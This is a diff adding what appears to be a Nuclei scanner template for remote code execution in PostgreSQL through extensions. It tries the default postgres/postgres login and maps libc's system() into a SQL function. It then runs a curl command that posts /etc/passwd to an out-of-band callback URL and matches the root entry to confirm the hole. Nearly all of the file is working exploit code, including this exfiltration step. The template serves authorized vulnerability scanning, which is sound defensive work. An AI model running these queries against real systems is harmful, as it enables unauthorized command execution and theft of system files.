@@ -1,0 +1,54 @@
+id: pgsql-extensions-rce
+
+info:
+  name: PostgreSQL 8.1  Extensions - Remote Code Execution
+  author: pussycat0x
+  severity: high
+  description: |
+    PostgreSQL allows for extensions, which are modules providing extra functionality like functions, operators, or types. Starting from version 8.1, these extensions must be compiled with a special header for compatibility with PostgreSQL's extension mechanism.
+  reference:
+    - https://www.dionach.com/postgresql-9-x-remote-command-execution/
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-libcso6
+    - https://hacktricks.boitatech.com.br/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: "product:\"PostgreSQL\""
+  tags: postgresql,js,network,rce
+javascript:
+  - pre-condition: |
+      isPortOpen(Host,Port);
+    code: |
+      const postgres = require('nuclei/postgres');
+      const client = new postgres.PGClient;
+      const collab = shurl
+      const qry = ["CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;", "SELECT system('curl -X POST -d @/etc/passwd "+ collab +"');"];
+      for (const x of qry){
+        connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, x);
+        Export(connected);
+      }
+
+    args:
+      Host: "{{Host}}"
+      Port: 5432
+      User: "{{usernames}}"
+      Pass: "{{password}}"
+      Db: "{{database}}"
+      shurl: http://{{interactsh-url}}
+
+    payloads:
+      usernames:
+        - postgres
+      database:
+        - postgres
+      password:
+        - postgres
+
+    attack: clusterbomb
+
+    matchers:
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "root:[x*]:0:0:"
+# digest: 4a0a00473045022100fa3ec05266a46b8f9b557902057f8d598a7201a450ec66ddd59addf549217ae802200ec92b3fb4829e2a00f33135991cdda2328c9b87dd2bfbc4357bb2655ed79da4:922c64590222798bb761d5b6d8e72950
